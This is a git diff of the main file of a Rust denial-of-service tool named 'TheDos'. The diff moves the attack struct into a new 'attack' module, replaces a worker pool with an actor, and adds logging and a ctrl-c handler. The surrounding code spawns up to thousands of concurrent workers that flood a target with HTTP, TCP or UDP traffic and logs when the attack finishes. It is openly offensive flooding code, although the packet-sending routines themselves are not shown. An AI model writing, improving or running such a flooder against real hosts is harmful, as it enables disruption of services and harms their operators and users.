@@ -29,11 +29,9 @@ use regex::Regex;
 use is_type::Is;
 use std::future::Future;
 use std::thread;
-use std::env;
 use std::sync::{Arc, Mutex, mpsc as std_mpsc};
 use std::process;
-use hyper::{Client, Uri, Response, Body, Request};
-use serde::{Deserialize, Serialize};
+use hyper::{Client, Uri, Body, Request};
 use rand::Rng;
 use borsh::{BorshDeserialize, BorshSerialize};
 use log4rs::append::console::ConsoleAppender;
@@ -44,17 +42,15 @@ use tokio::net::{TcpListener, TcpStream}; //-- async tcp listener and stream
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::sync::mpsc;
 use uuid::Uuid;
-use std::time::{Instant, Duration};
-use crate::scheduler::*;
+use crate::onion::{sync::ThreadPool, _async::Actor};
 
 
 
 
 
 
+pub mod attack;
 pub mod onion;
-pub mod scheduler;
-pub mod actor;
 
 
 
@@ -80,7 +76,7 @@ struct Arguments{
 
 
 #[tokio::main(flavor="multi_thread", worker_threads=10)] //// use the tokio multi threaded runtime by spawning 10 threads
-async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{
+async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{ // implementing the Error trait for any type that might cause to an error at runtime; traits doesn't have any fixed size at compile time thus we must put them inside a Box and since we're implementing it for also an unknown size type we must put a dyn keyword behind it
 
 
 
@@ -105,7 +101,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>
     let mut n_workers = arg.workers.unwrap_or(4096);
     let mut tcp_addr = arg.tcp_addr;
     let mut udp_addr = arg.udp_addr;
-    let mut workers = Workers::new(n_workers as usize);
+    let mut actor = Actor::new(n_workers as usize);
     
     
 
@@ -134,11 +130,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>
         assert_eq!(parsed_url.scheme_str(), Some("http")); // make sure the http is correct        
 
 
-        let thedos = onion::TheDos::new(Some(url.clone()), None, None, host.clone()); // pass String by reference convert them to &str automatically
+        let thedos = attack::TheDos::new(Some(url.clone()), None, None, host.clone()); // pass String by reference convert them to &str automatically
 
         for p in 0..n_workers{
+            info!("➔ worker {} started", p);
             let mut thedos = thedos.clone();
-            workers.spawn(async move{
+            actor.spawn(async move{
                 thedos.httpcall().await;
                 Ok(())
             }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
@@ -158,11 +155,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>
 
     if let Some(_) = tcp_addr{
        
-        let thedos = onion::TheDos::new(None, tcp_addr, None, None); // pass String by reference convert them to &str automatically
+        let thedos = attack::TheDos::new(None, tcp_addr, None, None); // pass String by reference convert them to &str automatically
 
         for p in 0..n_workers{
+            info!("➔ worker {} started", p);
             let mut thedos = thedos.clone();
-            workers.spawn(async move{
+            actor.spawn(async move{
                 thedos.tcpcall().await;
                 Ok(())
             }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
@@ -181,14 +179,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>
     
     if let Some(_) = udp_addr{
        
-        let thedos = onion::TheDos::new(None, None, udp_addr, None); // pass String by reference convert them to &str automatically
+        let thedos = attack::TheDos::new(None, None, udp_addr, None); // pass String by reference convert them to &str automatically
         
         for p in 0..n_workers{
+            info!("➔ worker {} started", p);
             let mut thedos = thedos.clone();
-            workers.spawn(async move{
+            actor.spawn(async move{
                 thedos.udpcall().await;
                 if thedos.flag == 1{
-                    info!("-- TheDos Attack Finished --");
+                    info!("➔ -- TheDos Attack Finished --");
                     process::exit(1);
                 }
                 Ok(())
@@ -198,8 +197,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>
     }
 
     
+
+    tokio::signal::ctrl_c().await?;
+    info!("ctrl-c received!");
+
             
-    workers.run().await // wait for all the workers to complete if there were any
+    actor.execute().await // wait for all the workers of this actor to complete if there were any
 
 
 
